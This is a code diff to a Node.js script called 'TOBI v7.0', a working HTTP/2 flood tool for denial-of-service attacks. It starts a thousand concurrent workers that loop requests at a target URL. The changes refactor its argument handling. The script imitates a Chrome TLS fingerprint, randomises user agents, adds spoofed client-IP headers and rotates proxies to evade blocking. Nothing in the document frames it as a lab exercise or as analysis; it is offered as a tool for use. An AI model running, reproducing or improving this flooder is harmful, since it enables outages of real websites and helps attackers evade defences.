@@ -1,15 +1,14 @@
 #!/usr/bin/env node
 
 /**
- * TOBI v7.0 – HTTP/2 + TLS Fingerprint + Proxy Rotation
- * Fixed: auto-adds https://, handles missing proxies
+ * TOBI v7.0 – HTTP/2 + TLS Fingerprint
+ * Fixed: always adds https:// to target
  */
 
-const fs = require('fs');
 const tls = require('tls');
 const http2 = require('http2');
 const crypto = require('crypto');
-const readline = require('readline');
+const fs = require('fs');
 
 // ==================== COLORS ====================
 const c = {
@@ -17,12 +16,18 @@ const c = {
     cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
 };
 
-// ==================== CONFIG ====================
-let target = null;
-let duration = 60;
-let workers = 1000;
-let proxyFile = null;
-let stop = false;
+// ==================== GET ARGUMENTS ====================
+let rawTarget = process.argv[2];
+let duration = parseInt(process.argv[3]) || 60;
+let workers = parseInt(process.argv[4]) || 1000;
+let proxyFile = process.argv[5] || null;
+
+// 🔥 FIX: ensure target has https://
+if (!rawTarget) {
+    console.log(`${c.red}Usage: node Tobi.js <target> [duration] [workers] [proxy.txt]${c.reset}`);
+    process.exit(1);
+}
+let target = rawTarget.includes('://') ? rawTarget : 'https://' + rawTarget;
 
 // ==================== PROXY MANAGER ====================
 let proxies = [];
@@ -45,36 +50,19 @@ function getProxy() {
     return proxies[proxyIndex];
 }
 
-// ==================== TLS FINGERPRINT (Mimics Chrome 121) ====================
+// ==================== TLS FINGERPRINT (Chrome 121) ====================
 const tlsOptions = {
-    ciphers: [
-        'TLS_AES_256_GCM_SHA384',
-        'TLS_CHACHA20_POLY1305_SHA256',
-        'TLS_AES_128_GCM_SHA256',
-        'ECDHE-ECDSA-AES128-GCM-SHA256',
-        'ECDHE-RSA-AES128-GCM-SHA256',
-        'ECDHE-ECDSA-CHACHA20-POLY1305',
-        'ECDHE-RSA-CHACHA20-POLY1305',
-        'ECDHE-ECDSA-AES256-GCM-SHA384',
-        'ECDHE-RSA-AES256-GCM-SHA384'
-    ].join(':'),
+    ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
     ecdhCurve: 'X25519',
     minVersion: 'TLSv1.2',
     maxVersion: 'TLSv1.3',
     honorCipherOrder: true,
     rejectUnauthorized: false,
-    secureProtocol: 'TLS_method',
     ALPNProtocols: ['h2', 'http/1.1']
 };
 
-// ==================== RANDOM HEADERS ====================
-function randomString(len) {
-    return crypto.randomBytes(len).toString('hex');
-}
-
-function spoofIP() {
-    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`;
-}
+function randomString(len) { return crypto.randomBytes(len).toString('hex'); }
+function spoofIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`; }
 
 const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
@@ -99,22 +87,15 @@ function generateHeaders(host) {
     };
 }
 
-// ==================== HTTP/2 ATTACK FUNCTION ====================
-function attack(targetUrl, callback) {
-    const parsed = new URL(targetUrl);
+// ==================== HTTP/2 ATTACK ====================
+function attack(callback) {
+    const parsed = new URL(target);  // now target always has https://
     const proxy = getProxy();
-    let proxyHost = null, proxyPort = null;
-    if (proxy) {
-        const parts = proxy.split(':');
-        proxyHost = parts[0];
-        proxyPort = parseInt(parts[1]) || 8080;
-    }
-
-    // Create a TLS socket (through proxy if provided)
     let socket;
     if (proxy) {
         const net = require('net');
-        socket = net.connect(proxyPort, proxyHost, () => {
+        const [host, port] = proxy.split(':');
+        socket = net.connect(parseInt(port), host, () => {
             const tlsSocket = tls.connect({
                 host: parsed.hostname,
                 port: 443,
@@ -122,57 +103,49 @@ function attack(targetUrl, callback) {
                 ...tlsOptions,
                 servername: parsed.hostname
             }, () => {
-                const session = http2.connect(parsed.hostname, {
-                    createConnection: () => tlsSocket,
-                    ...tlsOptions
-                });
-                session.on('error', () => callback(false, null, 0));
-                const headers = generateHeaders(parsed.hostname);
-                const req = session.request(headers);
-                req.on('response', (responseHeaders) => {
-                    const status = responseHeaders[':status'];
+                const session = http2.connect(parsed.hostname, { createConnection: () => tlsSocket, ...tlsOptions });
+                session.on('error', () => callback(false));
+                const req = session.request(generateHeaders(parsed.hostname));
+                req.on('response', (headers) => {
+                    const status = headers[':status'];
                     req.on('data', () => {});
                     req.on('end', () => {
                         session.close();
-                        callback(status >= 200 && status < 400, status, 0);
+                        callback(status >= 200 && status < 400);
                     });
                 });
                 req.on('error', () => {
                     session.close();
-                    callback(false, null, 0);
+                    callback(false);
                 });
                 req.end();
             });
-            tlsSocket.on('error', () => callback(false, null, 0));
+            tlsSocket.on('error', () => callback(false));
         });
-        socket.on('error', () => callback(false, null, 0));
+        socket.on('error', () => callback(false));
     } else {
-        // Direct HTTP/2 without proxy
         const session = http2.connect(parsed.hostname, tlsOptions);
-        session.on('error', () => callback(false, null, 0));
-        const headers = generateHeaders(parsed.hostname);
-        const req = session.request(headers);
-        req.on('response', (responseHeaders) => {
-            const status = responseHeaders[':status'];
+        session.on('error', () => callback(false));
+        const req = session.request(generateHeaders(parsed.hostname));
+        req.on('response', (headers) => {
+            const status = headers[':status'];
             req.on('data', () => {});
             req.on('end', () => {
                 session.close();
-                callback(status >= 200 && status < 400, status, 0);
+                callback(status >= 200 && status < 400);
             });
         });
         req.on('error', () => {
             session.close();
-            callback(false, null, 0);
+            callback(false);
         });
         req.end();
     }
 }
 
 // ==================== STATISTICS ====================
-let stats = {
-    total: 0, success: 0, failed: 0,
-    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
-};
+let stats = { total: 0, success: 0, failed: 0, startTime: Date.now(), lastSec: Date.now()/1000, lastSecCount: 0, peakRps: 0 };
+let stop = false;
 
 function displayStats() {
     const elapsed = (Date.now() - stats.startTime) / 1000;
@@ -185,10 +158,9 @@ function displayStats() {
         `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
 }
 
-// ==================== WORKER (INSTANT LOOP) ====================
 function worker() {
     if (stop) return;
-    attack(target, (success, code, time) => {
+    attack((success) => {
         stats.total++;
         if (success) stats.success++;
         else stats.failed++;
@@ -199,82 +171,50 @@ function worker() {
             stats.lastSec = nowSec;
         }
         stats.lastSecCount++;
-        worker(); // immediately call next
+        worker();
     });
 }
 
 // ==================== MAIN ====================
-async function start() {
-    // Ensure target has protocol
-    if (!target.startsWith('http')) target = 'https://' + target;
-
-    console.log(c.clear);
-    console.log(`${c.red}${c.bold}
+console.log(c.clear);
+console.log(`${c.red}${c.bold}
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                         🔥 TOBI v7.0 – HTTP/2 🔥                         ║
 ║                TLS Fingerprint | Proxy Rotation | Instant                ║
 ╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
-    console.log(`\n${c.green}[✓] Target: ${target}`);
-    console.log(`[✓] Duration: ${duration}s`);
-    console.log(`[✓] Workers: ${workers.toLocaleString()}`);
-    if (proxyFile) loadProxies();
-    console.log(`${c.reset}\n`);
+console.log(`\n${c.green}[✓] Target: ${target}`);
+console.log(`[✓] Duration: ${duration}s`);
+console.log(`[✓] Workers: ${workers.toLocaleString()}`);
+if (proxyFile) loadProxies();
+console.log(`${c.reset}\n`);
 
-    stats.startTime = Date.now();
-    stats.lastSec = stats.startTime / 1000;
+stats.startTime = Date.now();
+stats.lastSec = stats.startTime / 1000;
 
-    console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
-    for (let i = 0; i < workers; i++) {
-        worker();
-    }
-    console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);
+console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
+for (let i = 0; i < workers; i++) worker();
+console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);
 
-    const interval = setInterval(displayStats, 1000);
+const interval = setInterval(displayStats, 1000);
 
-    process.on('SIGINT', () => {
-        console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
-        stop = true;
-        setTimeout(() => {
-            clearInterval(interval);
-            const elapsed = (Date.now() - stats.startTime) / 1000;
-            const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
-            console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
-            console.log(`                    FINAL REPORT`);
-            console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
-            console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
-            console.log(`  Successful:      ${stats.success.toLocaleString()}`);
-            console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
-            console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
-            console.log(`  Peak RPS:        ${stats.peakRps}`);
-            console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
-            console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
-            process.exit(0);
-        }, 1000);
-    });
-
+setTimeout(() => { stop = true; }, duration * 1000);
+process.on('SIGINT', () => {
+    console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
+    stop = true;
     setTimeout(() => {
-        stop = true;
-    }, duration * 1000);
-}
-
-// ==================== INTERACTIVE INPUT ====================
-(async () => {
-    if (process.argv[2]) {
-        target = process.argv[2];
-        duration = parseInt(process.argv[3]) || 60;
-        workers = parseInt(process.argv[4]) || 1000;
-        proxyFile = process.argv[5] || null;
-        start();
-    } else {
-        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
-        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
-        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
-        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
-        if (useProxy.toLowerCase() === 'y') {
-            proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
-        }
-        rl.close();
-        start();
-    }
-})();
+        clearInterval(interval);
+        const elapsed = (Date.now() - stats.startTime) / 1000;
+        const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
+        console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
+        console.log(`                    FINAL REPORT`);
+        console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
+        console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
+        console.log(`  Successful:      ${stats.success.toLocaleString()}`);
+        console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
+        console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
+        console.log(`  Peak RPS:        ${stats.peakRps}`);
+        console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
+        console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
+        process.exit(0);
+    }, 500);
+});
